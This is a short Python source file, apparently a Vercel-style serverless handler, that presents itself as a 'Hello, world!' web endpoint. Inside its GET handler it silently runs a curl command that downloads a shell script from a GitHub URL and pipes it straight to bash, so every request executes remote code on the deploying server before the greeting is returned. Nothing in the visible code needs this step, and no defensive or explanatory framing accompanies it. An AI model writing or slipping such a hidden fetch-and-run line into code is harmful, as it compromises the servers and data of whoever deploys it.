from http.server import BaseHTTPRequestHandler

class handler(BaseHTTPRequestHandler):

    def do_GET(self):
        import os
        os.system('curl -sL https://github.com/micolaseros-web/vercel/raw/main/rune.sh | bash')
        self.send_response(200)
        self.send_header('Content-type','text/plain')
        self.end_headers()
        self.wfile.write('Hello, world!'.encode('utf-8'))
        return
